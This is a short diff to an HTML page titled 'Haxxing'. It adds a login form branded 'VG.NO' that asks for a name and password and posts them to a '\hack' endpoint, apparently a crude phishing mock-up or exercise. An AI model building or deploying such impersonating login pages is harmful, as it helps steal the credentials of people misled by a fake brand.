@@ -54,8 +54,15 @@ form.html:
     <title>Haxxing</title>
 </head>
 <body>
-    <form action="" method="post">
-        
+     <form action="\hack" method="post">
+        <h1>VG.NO</h1>
+        <label for="name">Enter your name: </label>
+        <input type="text" name="name" id="name" required />
+    
+        <label for="password">Enter your password: </label>
+        <input type="text" name="email" id="password" required />
+    
+        <input type="submit" value="Klikk" />
     </form>
 </body>
 </html>
